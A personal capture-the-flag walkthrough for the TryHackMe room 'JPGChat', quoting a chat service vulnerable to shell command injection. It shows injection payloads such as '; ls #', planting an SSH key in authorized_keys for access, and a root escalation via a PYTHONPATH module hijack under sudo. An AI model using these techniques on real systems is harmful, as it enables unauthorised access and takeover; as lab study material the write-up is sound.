---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . JPGChat
# DESCRIPTION       . Exploiting poorly made custom chatting service written in a certain language...
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/jpgchat
```

```
sudo nmap -sSVC -T5 -p- 10.10.5.191 -oN jpgchat
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fecc3e203fa2f8096f2ca3affa329c94 (RSA)
|   256 e8180cadd0635f9dbdb784b8ab7ed197 (ECDSA)
|_  256 821d6bab2d04d50b7a9beef464b57f64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=2/24%Time=65DA2F8B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
```

#### PORT 3000

```
nc 10.10.5.191 3000
```

```
the source code of this service can be found at our admin's github
```

- After googling "jpgchat github" I end up [here](https://github.com/Mozzie-jpg/JPChat).

- Here's the source code.

```
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

- We see that in `report_form` both our name and our message are used alongsisde `bash -c`, thus allowing for command injection.

- This can be bypassed with `; [command #`.
- `;` is used to mark the end of `echo` and the start of the next command.
- then, `#` is used to skip writing to the file and instead executing the command. 

```
your name:
; ls #
your report:
; ls #

bin
boot
box_setup
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
```

- I used the `ls` command multiple times and found out the `user.txt` flag in `/home/wes`. 
- We can grab it by using `; cat /home/wes/user.txt #`. 

- We could execute a reverse shell ... but I'm tired of this approach.

- Since SSH is enabled, I've decided to create a pair of SSH keys and place the public one on the server.

- I've used `; mkdir /home/wes/.ssh` to create the `.ssh` directory for wes.  
- On my host, I've generated a public:private key pair using `ssh-keygen`.

- I've placed the content of the public key in the `.ssh/authorized_keys` file (which will be created in the next command too).

```
; echo "ssh-rsaAAAAB3NzaC1yVXN9mRL993h7EopC{TRIMMED DOWN FOR READABILITY}rbd++9ovE=" > /home/wes/.ssh/authorized_keys #
```

- Then, from my host I've connected over with SSH.

```
ssh -i private_key wes@IP
```

```
ssh -i a wes@10.10.5.191

The authenticity of host '10.10.5.191 (10.10.5.191)' can't be established.
ED25519 key fingerprint is SHA256:kVofZUap+iF3U0N/x8eQa5Yvpx+y0z+oqFNIQFwNCOg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.10.5.191' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)
```

#### PRIVILEGE ESCALATION

- After my checks for privilege escalation, I found the following 3 pieces of information that we need to link together to escalate privileges.

```
sudo -l
(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

```
ls -l /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15  2021 /opt/development/test_module.py
```

```
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

- So, we can run `/opt/development/test_module.py` as root.
- The script is not writable by us but is executed by root.
- What we care about is that the script imports a module.

- We can create another `compare.py` in our home directory with the following code

```
import pty
pty.spawn("/bin/bash")
exit()
```

- Then, update the ENV variable so we force python to load our `compare.py`.

```
export PYTHONPATH=.
```

- Then, just execute the script with sudo.

```
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py 
```

- The last flag is located in `/root/root.txt`.
	

